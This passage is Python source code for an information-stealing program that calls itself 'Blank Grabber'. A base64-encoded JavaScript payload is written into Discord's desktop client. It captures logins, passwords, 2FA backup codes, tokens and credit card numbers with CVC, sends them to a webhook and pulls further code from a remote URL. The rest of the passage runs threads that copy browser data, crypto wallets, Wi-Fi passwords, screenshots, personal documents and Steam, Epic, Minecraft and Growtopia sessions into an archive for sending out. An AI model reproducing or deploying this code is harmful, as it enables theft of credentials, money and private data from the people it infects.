B7CiAgICAgICAgImNvbnRlbnQiOiBgKioke2FjY291bnQudXNlcm5hbWV9KioganVzdCBjaGFuZ2VkIGhpcyBwYXNzd29yZCFgLAogICAgICAgICJlbWJlZHMiOiBbewogICAgICAgICAgICAiZmllbGRzIjogW3sKICAgICAgICAgICAgICAgICJuYW1lIjogIk5ldyBQYXNzd29yZCIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiAiYCIgKyBuZXdQYXNzd29yZCArICJgIiwKICAgICAgICAgICAgICAgICJpbmxpbmUiOiB0cnVlCiAgICAgICAgICAgIH0sIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIk9sZCBQYXNzd29yZCIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiAiYCIgKyBvbGRQYXNzd29yZCArICJgIiwKICAgICAgICAgICAgICAgICJpbmxpbmUiOiB0cnVlCiAgICAgICAgICAgIH1dCiAgICAgICAgfV0KICAgIH07CgogICAgaG9va2VyKGNvbnRlbnQsIHRva2VuLCBhY2NvdW50KTsKfQoKY29uc3QgQ3JlZGl0Q2FyZEFkZGVkID0gYXN5bmMgKG51bWJlciwgY3ZjLCBtb250aCwgeWVhciwgdG9rZW4pID0+IHsKICAgIGNvbnN0IGFjY291bnQgPSBhd2FpdCBmZXRjaEFjY291bnQodG9rZW4pCgogICAgY29uc3QgY29udGVudCA9IHsKICAgICAgICAiY29udGVudCI6IGAqKiR7YWNjb3VudC51c2VybmFtZX0qKiBqdXN0IGFkZGVkIGEgY3JlZGl0IGNhcmQhYCwKICAgICAgICAiZW1iZWRzIjogW3sKICAgICAgICAgICAgImZpZWxkcyI6IFt7CiAgICAgICAgICAgICAgICAibmFtZSI6ICJOdW1iZXIiLAogICAgICAgICAgICAgICAgInZhbHVlIjogImAiICsgbnVtYmVyICsgImAiLAogICAgICAgICAgICAgICAgImlubGluZSI6IHRydWUKICAgICAgICAgICAgfSwgewogICAgICAgICAgICAgICAgIm5hbWUiOiAiQ1ZDIiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6ICJgIiArIGN2YyArICJgIiwKICAgICAgICAgICAgICAgICJpbmxpbmUiOiB0cnVlCiAgICAgICAgICAgIH0sIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIkV4cGlyYXRpb24iLAogICAgICAgICAgICAgICAgInZhbHVlIjogImAiICsgbW9udGggKyAiLyIgKyB5ZWFyICsgImAiLAogICAgICAgICAgICAgICAgImlubGluZSI6IHRydWUKICAgICAgICAgICAgfV0KICAgICAgICB9XQogICAgfTsKCiAgICBob29rZXIoY29udGVudCwgdG9rZW4sIGFjY291bnQpOwp9Cgpjb25zdCBQYXlwYWxBZGRlZCA9IGFzeW5jICh0b2tlbikgPT4gewogICAgY29uc3QgYWNjb3VudCA9IGF3YWl0IGZldGNoQWNjb3VudCh0b2tlbikKCiAgICBjb25zdCBjb250ZW50ID0gewogICAgICAgICJjb250ZW50IjogYCoqJHthY2NvdW50LnVzZXJuYW1lfSoqIGp1c3QgYWRkZWQgYSA8OnBheXBhbDoxMTQ4NjUzMzA1Mzc2MDM0OTY3PiBhY2NvdW50IWAsCiAgICAgICAgImVtYmVkcyI6IFt7CiAgICAgICAgICAgICJmaWVsZHMiOiBbewogICAgICAgICAgICAgICAgIm5hbWUiOiAiRW1haWwiLAogICAgICAgICAgICAgICAgInZhbHVlIjogImAiICsgYWNjb3VudC5lbWFpbCArICJgIiwKICAgICAgICAgICAgICAgICJpbmxpbmUiOiB0cnVlCiAgICAgICAgICAgIH0sIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIlBob25lIiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6ICJgIiArIChhY2NvdW50LnBob25lIHx8ICJOb25lIikgKyAiYCIsCiAgICAgICAgICAgICAgICAiaW5saW5lIjogdHJ1ZQogICAgICAgICAgICB9XQogICAgICAgIH1dCiAgICB9OwoKICAgIGhvb2tlcihjb250ZW50LCB0b2tlbiwgYWNjb3VudCk7Cn0KCmNvbnN0IGRpc2NvcmRQYXRoID0gKGZ1bmN0aW9uICgpIHsKICAgIGNvbnN0IGFwcCA9IGFyZ3NbMF0uc3BsaXQocGF0aC5zZXApLnNsaWNlKDAsIC0xKS5qb2luKHBhdGguc2VwKTsKICAgIGxldCByZXNvdXJjZVBhdGg7CgogICAgaWYgKHByb2Nlc3MucGxhdGZvcm0gPT09ICd3aW4zMicpIHsKICAgICAgICByZXNvdXJjZVBhdGggPSBwYXRoLmpvaW4oYXBwLCAncmVzb3VyY2VzJyk7CiAgICB9IGVsc2UgaWYgKHByb2Nlc3MucGxhdGZvcm0gPT09ICdkYXJ3aW4nKSB7CiAgICAgICAgcmVzb3VyY2VQYXRoID0gcGF0aC5qb2luKGFwcCwgJ0NvbnRlbnRzJywgJ1Jlc291cmNlcycpOwogICAgfQoKICAgIGlmIChmcy5leGlzdHNTeW5jKHJlc291cmNlUGF0aCkpIHJldHVybiB7CiAgICAgICAgcmVzb3VyY2VQYXRoLAogICAgICAgIGFwcAogICAgfTsKICAgIHJldHVybiB7CiAgICAgICAgdW5kZWZpbmVkLAogICAgICAgIHVuZGVmaW5lZAogICAgfTsKfSkoKTsKCmFzeW5jIGZ1bmN0aW9uIGluaXRpYXRpb24oKSB7CiAgICBpZiAoZnMuZXhpc3RzU3luYyhwYXRoLmpvaW4oX19kaXJuYW1lLCAnaW5pdGlhdGlvbicpKSkgewogICAgICAgIGZzLnJtZGlyU3luYyhwYXRoLmpvaW4oX19kaXJuYW1lLCAnaW5pdGlhdGlvbicpKTsKCiAgICAgICAgY29uc3QgdG9rZW4gPSBhd2FpdCBnZXRUb2tlbigpOwogICAgICAgIGlmICghdG9rZW4pIHJldHVybjsKCiAgICAgICAgY29uc3QgYWNjb3VudCA9IGF3YWl0IGZldGNoQWNjb3VudCh0b2tlbikKCiAgICAgICAgY29uc3QgY29udGVudCA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBgKioke2FjY291bnQudXNlcm5hbWV9KioganVzdCBnb3QgaW5qZWN0ZWQhYCwKCiAgICAgICAgICAgICJlbWJlZHMiOiBbewogICAgICAgICAgICAgICAgImZpZWxkcyI6IFt7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiRW1haWwiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6ICJgIiArIGFjY291bnQuZW1haWwgKyAiYCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IHRydWUKICAgICAgICAgICAgICAgIH0sIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJQaG9uZSIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogImAiICsgKGFjY291bnQucGhvbmUgfHwgIk5vbmUiKSArICJgIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogdHJ1ZQogICAgICAgICAgICAgICAgfV0KICAgICAgICAgICAgfV0KICAgICAgICB9OwoKICAgICAgICBhd2FpdCBob29rZXIoY29udGVudCwgdG9rZW4sIGFjY291bnQpOwogICAgICAgIGNsZWFyQWxsVXNlckRhdGEoKTsKICAgIH0KCiAgICBjb25zdCB7CiAgICAgICAgcmVzb3VyY2VQYXRoLAogICAgICAgIGFwcAogICAgfSA9IGRpc2NvcmRQYXRoOwogICAgaWYgKHJlc291cmNlUGF0aCA9PT0gdW5kZWZpbmVkIHx8IGFwcCA9PT0gdW5kZWZpbmVkKSByZXR1cm47CiAgICBjb25zdCBhcHBQYXRoID0gcGF0aC5qb2luKHJlc291cmNlUGF0aCwgJ2FwcCcpOwogICAgY29uc3QgcGFja2FnZUpzb24gPSBwYXRoLmpvaW4oYXBwUGF0aCwgJ3BhY2thZ2UuanNvbicpOwogICAgY29uc3QgcmVzb3VyY2VJbmRleCA9IHBhdGguam9pbihhcHBQYXRoLCAnaW5kZXguanMnKTsKICAgIGNvbnN0IGNvcmVWYWwgPSBmcy5yZWFkZGlyU3luYyhgJHthcHB9XFxtb2R1bGVzXFxgKS5maWx0ZXIoeCA9PiAvZGlzY29yZF9kZXNrdG9wX2NvcmUtKz8vLnRlc3QoeCkpWzBdCiAgICBjb25zdCBpbmRleEpzID0gYCR7YXBwfVxcbW9kdWxlc1xcJHtjb3JlVmFsfVxcZGlzY29yZF9kZXNrdG9wX2NvcmVcXGluZGV4LmpzYDsKICAgIGNvbnN0IGJkUGF0aCA9IHBhdGguam9pbihwcm9jZXNzLmVudi5BUFBEQVRBLCAnXFxiZXR0ZXJkaXNjb3JkXFxkYXRhXFxiZXR0ZXJkaXNjb3JkLmFzYXInKTsKICAgIGlmICghZnMuZXhpc3RzU3luYyhhcHBQYXRoKSkgZnMubWtkaXJTeW5jKGFwcFBhdGgpOwogICAgaWYgKGZzLmV4aXN0c1N5bmMocGFja2FnZUpzb24pKSBmcy51bmxpbmtTeW5jKHBhY2thZ2VKc29uKTsKICAgIGlmIChmcy5leGlzdHNTeW5jKHJlc291cmNlSW5kZXgpKSBmcy51bmxpbmtTeW5jKHJlc291cmNlSW5kZXgpOwoKICAgIGlmIChwcm9jZXNzLnBsYXRmb3JtID09PSAnd2luMzInIHx8IHByb2Nlc3MucGxhdGZvcm0gPT09ICdkYXJ3aW4nKSB7CiAgICAgICAgZnMud3JpdGVGaWxlU3luYygKICAgICAgICAgICAgcGFja2FnZUpzb24sCiAgICAgICAgICAgIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICBuYW1lOiAnZGlzY29yZCcsCiAgICAgICAgICAgICAgICAgICAgbWFpbjogJ2luZGV4LmpzJywKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBudWxsLAogICAgICAgICAgICAgICAgNCwKICAgICAgICAgICAgKSwKICAgICAgICApOwoKICAgICAgICBjb25zdCBzdGFydFVwU2NyaXB0ID0gYGNvbnN0IGZzID0gcmVxdWlyZSgnZnMnKSwgaHR0cHMgPSByZXF1aXJlKCdodHRwcycpOwogIGNvbnN0IGluZGV4SnMgPSAnJHtpbmRleEpzfSc7CiAgY29uc3QgYmRQYXRoID0gJyR7YmRQYXRofSc7CiAgY29uc3QgZmlsZVNpemUgPSBmcy5zdGF0U3luYyhpbmRleEpzKS5zaXplCiAgZnMucmVhZEZpbGVTeW5jKGluZGV4SnMsICd1dGY4JywgKGVyciwgZGF0YSkgPT4gewogICAgICBpZiAoZmlsZVNpemUgPCAyMDAwMCB8fCBkYXRhID09PSAibW9kdWxlLmV4cG9ydHMgPSByZXF1aXJlKCcuL2NvcmUuYXNhcicpIikgCiAgICAgICAgICBpbml0KCk7CiAgfSkKICBhc3luYyBmdW5jdGlvbiBpbml0KCkgewogICAgICBodHRwcy5nZXQoJyR7Q09ORklHLmluamVjdGlvbl91cmx9JywgKHJlcykgPT4gewogICAgICAgICAgY29uc3QgZmlsZSA9IGZzLmNyZWF0ZVdyaXRlU3RyZWFtKGluZGV4SnMpOwogICAgICAgICAgcmVzLnJlcGxhY2UoJ1lPVVJfV0VCSE9PS19IRVJFJywgJyR7Q09ORklHLndlYmhvb2t9JykKICAgICAgICAgIHJlcy5waXBlKGZpbGUpOwogICAgICAgICAgZmlsZS5vbignZmluaXNoJywgKCkgPT4gewogICAgICAgICAgICAgIGZpbGUuY2xvc2UoKTsKICAgICAgICAgIH0pOwogICAgICAKICAgICAgfSkub24oImVycm9yIiwgKGVycikgPT4gewogICAgICAgICAgc2V0VGltZW91dChpbml0KCksIDEwMDAwKTsKICAgICAgfSk7CiAgfQogIHJlcXVpcmUoJyR7cGF0aC5qb2luKHJlc291cmNlUGF0aCwgJ2FwcC5hc2FyJyl9JykKICBpZiAoZnMuZXhpc3RzU3luYyhiZFBhdGgpKSByZXF1aXJlKGJkUGF0aCk7YDsKICAgICAgICBmcy53cml0ZUZpbGVTeW5jKHJlc291cmNlSW5kZXgsIHN0YXJ0VXBTY3JpcHQucmVwbGFjZSgvXFwvZywgJ1xcXFwnKSk7CiAgICB9Cn0KCmxldCBlbWFpbCA9ICIiOwpsZXQgcGFzc3dvcmQgPSAiIjsKbGV0IGluaXRpYXRpb25DYWxsZWQgPSBmYWxzZTsKY29uc3QgY3JlYXRlV2luZG93ID0gKCkgPT4gewogICAgbWFpbldpbmRvdyA9IEJyb3dzZXJXaW5kb3cuZ2V0QWxsV2luZG93cygpWzBdOwogICAgaWYgKCFtYWluV2luZG93KSByZXR1cm4KCiAgICBtYWluV2luZG93LndlYkNvbnRlbnRzLmRlYnVnZ2VyLmF0dGFjaCgnMS4zJyk7CiAgICBtYWluV2luZG93LndlYkNvbnRlbnRzLmRlYnVnZ2VyLm9uKCdtZXNzYWdlJywgYXN5bmMgKF8sIG1ldGhvZCwgcGFyYW1zKSA9PiB7CiAgICAgICAgaWYgKCFpbml0aWF0aW9uQ2FsbGVkKSB7CiAgICAgICAgICAgIGF3YWl0IGluaXRpYXRpb24oKTsKICAgICAgICAgICAgaW5pdGlhdGlvbkNhbGxlZCA9IHRydWU7CiAgICAgICAgfQoKICAgICAgICBpZiAobWV0aG9kICE9PSAnTmV0d29yay5yZXNwb25zZVJlY2VpdmVkJykgcmV0dXJuOwogICAgICAgIGlmICghQ09ORklHLmZpbHRlcnMudXJscy5zb21lKHVybCA9PiBwYXJhbXMucmVzcG9uc2UudXJsLmVuZHNXaXRoKHVybCkpKSByZXR1cm47CiAgICAgICAgaWYgKCFbMjAwLCAyMDJdLmluY2x1ZGVzKHBhcmFtcy5yZXNwb25zZS5zdGF0dXMpKSByZXR1cm47CgogICAgICAgIGNvbnN0IHJlc3BvbnNlVW5wYXJzZWREYXRhID0gYXdhaXQgbWFpbldpbmRvdy53ZWJDb250ZW50cy5kZWJ1Z2dlci5zZW5kQ29tbWFuZCgnTmV0d29yay5nZXRSZXNwb25zZUJvZHknLCB7CiAgICAgICAgICAgIHJlcXVlc3RJZDogcGFyYW1zLnJlcXVlc3RJZAogICAgICAgIH0pOwogICAgICAgIGNvbnN0IHJlc3BvbnNlRGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VVbnBhcnNlZERhdGEuYm9keSk7CgogICAgICAgIGNvbnN0IHJlcXVlc3RVbnBhcnNlZERhdGEgPSBhd2FpdCBtYWluV2luZG93LndlYkNvbnRlbnRzLmRlYnVnZ2VyLnNlbmRDb21tYW5kKCdOZXR3b3JrLmdldFJlcXVlc3RQb3N0RGF0YScsIHsKICAgICAgICAgICAgcmVxdWVzdElkOiBwYXJhbXMucmVxdWVzdElkCiAgICAgICAgfSk7CiAgICAgICAgY29uc3QgcmVxdWVzdERhdGEgPSBKU09OLnBhcnNlKHJlcXVlc3RVbnBhcnNlZERhdGEucG9zdERhdGEpOwoKICAgICAgICBzd2l0Y2ggKHRydWUpIHsKICAgICAgICAgICAgY2FzZSBwYXJhbXMucmVzcG9uc2UudXJsLmVuZHNXaXRoKCcvbG9naW4nKToKICAgICAgICAgICAgICAgIGlmICghcmVzcG9uc2VEYXRhLnRva2VuKSB7CiAgICAgICAgICAgICAgICAgICAgZW1haWwgPSByZXF1ZXN0RGF0YS5sb2dpbjsKICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IHJlcXVlc3REYXRhLnBhc3N3b3JkOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsgLy8gMkZBCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBFbWFpbFBhc3NUb2tlbihyZXF1ZXN0RGF0YS5sb2dpbiwgcmVxdWVzdERhdGEucGFzc3dvcmQsIHJlc3BvbnNlRGF0YS50b2tlbiwgImxvZ2dlZCBpbiIpOwogICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICBjYXNlIHBhcmFtcy5yZXNwb25zZS51cmwuZW5kc1dpdGgoJy9yZWdpc3RlcicpOgogICAgICAgICAgICAgICAgRW1haWxQYXNzVG9rZW4ocmVxdWVzdERhdGEuZW1haWwsIHJlcXVlc3REYXRhLnBhc3N3b3JkLCByZXNwb25zZURhdGEudG9rZW4sICJzaWduZWQgdXAiKTsKICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgY2FzZSBwYXJhbXMucmVzcG9uc2UudXJsLmVuZHNXaXRoKCcvdG90cCcpOgogICAgICAgICAgICAgICAgRW1haWxQYXNzVG9rZW4oZW1haWwsIHBhc3N3b3JkLCByZXNwb25zZURhdGEudG9rZW4sICJsb2dnZWQgaW4gd2l0aCAyRkEiKTsKICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgY2FzZSBwYXJhbXMucmVzcG9uc2UudXJsLmVuZHNXaXRoKCcvY29kZXMtdmVyaWZpY2F0aW9uJyk6CiAgICAgICAgICAgICAgICBCYWNrdXBDb2Rlc1ZpZXdlZChyZXNwb25zZURhdGEuYmFja3VwX2NvZGVzLCBhd2FpdCBnZXRUb2tlbigpKTsKICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgY2FzZSBwYXJhbXMucmVzcG9uc2UudXJsLmVuZHNXaXRoKCcvQG1lJyk6CiAgICAgICAgICAgICAgICBpZiAoIXJlcXVlc3REYXRhLnBhc3N3b3JkKSByZXR1cm47CgogICAgICAgICAgICAgICAgaWYgKHJlcXVlc3REYXRhLmVtYWlsKSB7CiAgICAgICAgICAgICAgICAgICAgRW1haWxQYXNzVG9rZW4ocmVxdWVzdERhdGEuZW1haWwsIHJlcXVlc3REYXRhLnBhc3N3b3JkLCByZXNwb25zZURhdGEudG9rZW4sICJjaGFuZ2VkIGhpcyBlbWFpbCB0byAqKiIgKyByZXF1ZXN0RGF0YS5lbWFpbCArICIqKiIpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0RGF0YS5uZXdfcGFzc3dvcmQpIHsKICAgICAgICAgICAgICAgICAgICBQYXNzd29yZENoYW5nZWQocmVxdWVzdERhdGEubmV3X3Bhc3N3b3JkLCByZXF1ZXN0RGF0YS5wYXNzd29yZCwgcmVzcG9uc2VEYXRhLnRva2VuKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgIH0pOwoKICAgIG1haW5XaW5kb3cud2ViQ29udGVudHMuZGVidWdnZXIuc2VuZENvbW1hbmQoJ05ldHdvcmsuZW5hYmxlJyk7CgogICAgbWFpbldpbmRvdy5vbignY2xvc2VkJywgKCkgPT4gewogICAgICAgIGNyZWF0ZVdpbmRvdygpCiAgICB9KTsKfQpjcmVhdGVXaW5kb3coKTsKCnNlc3Npb24uZGVmYXVsdFNlc3Npb24ud2ViUmVxdWVzdC5vbkNvbXBsZXRlZChDT05GSUcucGF5bWVudF9maWx0ZXJzLCBhc3luYyAoZGV0YWlscywgXykgPT4gewogICAgaWYgKCFbMjAwLCAyMDJdLmluY2x1ZGVzKGRldGFpbHMuc3RhdHVzQ29kZSkpIHJldHVybjsKICAgIGlmIChkZXRhaWxzLm1ldGhvZCAhPSAnUE9TVCcpIHJldHVybjsKICAgIHN3aXRjaCAodHJ1ZSkgewogICAgICAgIGNhc2UgZGV0YWlscy51cmwuZW5kc1dpdGgoJ3Rva2VucycpOgogICAgICAgICAgICBjb25zdCBpdGVtID0gcXVlcnlzdHJpbmcucGFyc2UoQnVmZmVyLmZyb20oZGV0YWlscy51cGxvYWREYXRhWzBdLmJ5dGVzKS50b1N0cmluZygpKTsKICAgICAgICAgICAgQ3JlZGl0Q2FyZEFkZGVkKGl0ZW1bJ2NhcmRbbnVtYmVyXSddLCBpdGVtWydjYXJkW2N2Y10nXSwgaXRlbVsnY2FyZFtleHBfbW9udGhdJ10sIGl0ZW1bJ2NhcmRbZXhwX3llYXJdJ10sIGF3YWl0IGdldFRva2VuKCkpOwogICAgICAgICAgICBicmVhazsKCiAgICAgICAgY2FzZSBkZXRhaWxzLnVybC5lbmRzV2l0aCgncGF5cGFsX2FjY291bnRzJyk6CiAgICAgICAgICAgIFBheXBhbEFkZGVkKGF3YWl0IGdldFRva2VuKCkpOwogICAgICAgICAgICBicmVhazsKICAgIH0KfSk7CgpzZXNzaW9uLmRlZmF1bHRTZXNzaW9uLndlYlJlcXVlc3Qub25CZWZvcmVSZXF1ZXN0KENPTkZJRy5maWx0ZXJzMiwgKGRldGFpbHMsIGNhbGxiYWNrKSA9PiB7CiAgICBpZiAoZGV0YWlscy51cmwuc3RhcnRzV2l0aCgid3NzOi8vcmVtb3RlLWF1dGgtZ2F0ZXdheSIpIHx8IGRldGFpbHMudXJsLmVuZHNXaXRoKCJhdXRoL3Nlc3Npb25zIikpIHJldHVybiBjYWxsYmFjayh7CiAgICAgICAgY2FuY2VsOiB0cnVlCiAgICB9KQp9KTsKCm1vZHVsZS5leHBvcnRzID0gcmVxdWlyZSgiLi9jb3JlLmFzYXIiKTs=').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
        except Exception:
            return None
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for (root, _, files) in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding='utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

class BlankGrabber:
    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None
    Cookies: list = []
    PasswordsCount: int = 0
    HistoryCount: int = 0
    AutofillCount: int = 0
    RobloxCookiesCount: int = 0
    DiscordTokensCount: int = 0
    WifiPasswordsCount: int = 0
    MinecraftSessions: int = 0
    WebcamPicturesCount: int = 0
    TelegramSessionsCount: int = 0
    CommonFilesCount: int = 0
    WalletsCount: int = 0
    ScreenshotTaken: bool = False
    SystemInfoStolen: bool = False
    SteamStolen: bool = False
    EpicStolen: bool = False
    UplayStolen: bool = False
    BattleNetStolen: bool = False
    GrowtopiaStolen: bool = False

    def __init__(self) -> None:
        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        while True:
            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        Logger.info('Creating temporary folder')
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break
        for (func, daemon) in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.StealBattleNet, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
            thread = Thread(target=func, daemon=daemon)
            thread.start()
            Tasks.AddTask(thread)
        Tasks.WaitForAll()
        Logger.info('All functions ended')
        if Errors.errors:
            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
        self.SendData()
        try:
            Logger.info('Removing archive')
            os.remove(self.ArchivePath)
            Logger.info('Removing temporary folder')
            shutil.rmtree(self.TempFolder)
        except Exception:
            pass

    @Errors.Catch
    def StealCommonFiles(self) -> None:
        if Settings.CaptureCommonFiles:
            for (name, dir) in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    file: str
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, 'Common Files', name, file))
                                    self.CommonFilesCount += 1
                                except Exception:
                                    pass

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Minecraft related files')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
            userProfile = os.getenv('userprofile')
            roaming = os.getenv('appdata')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for (name, path) in minecraftPaths.items():
                if os.path.isfile(path):
                    try:
                        os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                        self.MinecraftSessions += 1
                    except Exception:
                        continue

    @Errors.Catch
    def StealGrowtopia(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Growtopia session')
            growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Growtopia')
            multiple = len(growtopiadirs) > 1
            for (index, path) in enumerate(growtopiadirs):
                targetFilePath = os.path.join(path, 'save.dat')
                if os.path.isfile(targetFilePath):
                    try:
                        _saveToPath = saveToPath
                        if multiple:
                            _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                        os.makedirs(_saveToPath, exist_ok=True)
                        shutil.copy(targetFilePath, os.path.join(_saveToPath, 'save.dat'))
                        self.GrowtopiaStolen = True
                    except Exception:
                        shutil.rmtree(_saveToPath)
            if multiple and self.GrowtopiaStolen:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                    file.write('Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealEpic(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Epic session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '[RememberMe]' in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                            self.EpicStolen = True
                        except Exception:
                            pass

    @Errors.Catch
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Steam session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
            steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
            multiple = len(steamPaths) > 1
            if not steamPaths:
                steamPaths.append('C:\\Program Files (x86)\\Steam')
            for (index, steamPath) in enumerate(steamPaths):
                steamConfigPath = os.path.join(steamPath, 'config')
                if os.path.isdir(steamConfigPath):
                    loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                    if os.path.isfile(loginFile):
                        with open(loginFile) as file:
                            contents = file.read()
                        if '"RememberPassword"\t\t"1"' in contents:
                            try:
                                _saveToPath = saveToPath
                                if multiple:
                                    _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                                os.makedirs(_saveToPath, exist_ok=True)
                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
                                for item in os.listdir(steamPath):
                                    if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                        shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                        self.SteamStolen = True
                            except Exception:
                                pass
            if self.SteamStolen and multiple:
                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
